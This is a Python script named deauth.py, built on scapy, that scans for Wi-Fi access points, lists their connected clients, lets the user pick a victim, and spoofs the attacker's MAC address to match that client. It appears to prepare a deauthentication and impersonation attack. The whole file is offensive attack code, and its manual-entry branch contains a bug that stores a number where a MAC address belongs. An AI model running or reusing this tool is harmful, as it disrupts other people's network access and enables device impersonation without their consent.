# implement with sets instead of lists
from scapy.all import *
from helper import *

found = {}
host_list = []
aps = []
selected = []
clients = set()

if len(sys.argv) < 2:
  print("usage: deauth.py <iface>")
  sys.exit(-1)
conf.iface = sys.argv[1]

os.system("clear")

manual = input("0 : scan for target APs \n1 : manual target AP entry\nchoice : ")
while manual != "0" and manual != "1":
  manual = input("Invalid choice\nchoice : ")

select_channel(conf.iface)

# Get AP address(es)
if manual == "0":
  data = select_aps(conf.iface)
  aps = data["aps"]
  host_list = data["host_list"]

if manual == "1":
  # TODO: Add option to input multiple mac addresses
  entered = input("target AP MAC address (use commas to seperate multiple) : ").replace(" ", "").split(",")
  for i in range(len(entered)):
    host_list.append([1, {"cli": entered[i]}])
  aps = range(len(entered))
  # TODO: Check if mac address is valid

selected = [host_list[n][0].lower() for n in aps]

print("searching for target clients")
search = True
while search:
  clients = discover_clients(conf.iface, selected, 100)["found_clients"]
  if not len(clients) is 0:
    search = False

clients = list(clients)

for i in range(len(clients)):
  print(str(i) + " : " + clients[i])

valid = False
while not valid:
  target_client = input("target client: ")
  if target_client.isdigit():
    if int(target_client) < len(clients):
      valid = True
target_client = clients[int(target_client)]
print(target_client)

# Spoofing MAC address
spoof_mac(conf.iface, target_client)

# TODO: Add code to put card back into managed mode on Linux
if sys.platform.startswith('darwin'):
  os.system("killall airport")
